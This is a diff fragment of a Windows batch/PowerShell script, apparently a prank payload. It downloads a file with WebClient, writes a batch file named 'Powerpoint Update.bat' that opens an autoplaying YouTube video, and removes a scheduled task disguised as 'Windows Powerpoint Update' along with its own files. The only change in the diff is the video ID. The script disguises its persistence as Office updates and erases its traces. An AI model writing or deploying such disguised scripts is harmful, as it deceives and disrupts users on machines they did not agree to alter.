@@ -2,7 +2,7 @@ powershell $client = new-object System.Net.WebClient;$client.DownloadFile('https
 
 powershell rm """C:\Users\Public\Documents\Powerpoint Update.bat"""
 
-powershell.exe New-Item -Path 'C:\Users\Public\Documents\Powerpoint Update.bat' -ItemType File; Set-Content -Path 'C:\Users\Public\Documents\Powerpoint Update.bat' -Value 'powershell.exe start https://www.youtube.com/embed/bC_W93NwQ5A?rel=0"""""""""&&"""""""""autoplay=1; SCHTASKS /Delete /TN """""""""Windows Powerpoint Update""""""""" /f;rm """""""""C:\Users\Public\Documents\doge.jpg"""""""""; rm """""""""C:\Users\Public\Documents\Powerpoint Update.bat"""""""""'
+powershell.exe New-Item -Path 'C:\Users\Public\Documents\Powerpoint Update.bat' -ItemType File; Set-Content -Path 'C:\Users\Public\Documents\Powerpoint Update.bat' -Value 'powershell.exe start https://www.youtube.com/embed/rxRg4knRQjg?rel=0"""""""""&&"""""""""autoplay=1; SCHTASKS /Delete /TN """""""""Windows Powerpoint Update""""""""" /f;rm """""""""C:\Users\Public\Documents\doge.jpg"""""""""; rm """""""""C:\Users\Public\Documents\Powerpoint Update.bat"""""""""'
 
 SCHTASKS /Delete /TN "Windows Powerpoint Update" /f
 
